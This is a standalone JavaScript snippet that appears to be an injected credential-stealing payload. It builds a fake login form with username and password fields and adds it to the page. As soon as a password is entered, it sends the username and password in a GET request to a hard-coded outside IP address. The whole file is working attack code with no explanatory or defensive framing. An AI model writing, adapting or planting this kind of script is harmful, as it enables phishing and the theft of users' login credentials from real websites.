function handler() {
  console.log(1);
  if(this.status == 200 && this.responseText != null) {
    // success!
    if (this.responseText.search("Not Found")){
      //do whatever you want
      console.log(2);
}
  } else {
    // something went wrong
    //console.log("hmmm...")
  }
}

function sendToBaker(u,p){
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = handler; 
 xhr.open("GET", 'https://67.208.216.106/TESTTEST?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p), true);
 xhr.send();

}

/* build the form*/
var f = document.createElement("form");
f.setAttribute("action", "/auth/login");
f.setAttribute("method", "POST");
f.setAttribute("class","login-form");


/* username */

var i = document.createElement("input");
i.setAttribute("type", "text");
i.setAttribute("id", "username");
i.setAttribute("name", "username");
i.setAttribute("class", "form-control");
//i.setAttribute("style", "position:fixed;top:0;left:0;padding:20px;background-color:black;width:33%;");
i.addEventListener("change", function() {
    var username = document.getElementById("username").value;
    console.log(username);
});

f.appendChild(i);


/*password*/

var p = document.createElement("input");
p.setAttribute("type", "password");
p.setAttribute("id", "password");
p.setAttribute("name", "password");
//p.setAttribute("style", "position:fixed;top:40;left:0;padding:20px;background-color:black;width:33%;");

p.addEventListener("change", function() {
    var password = document.getElementById("password").value;
    console.log(password);
    sendToBaker( document.getElementById('username').value, password);
});
f.appendChild(p);

var b = document.createElement("button");
b.setAttribute("type", "submit");
b.setAttribute("id", "login-btn");

f.appendChild(b);


document.body.appendChild(f);
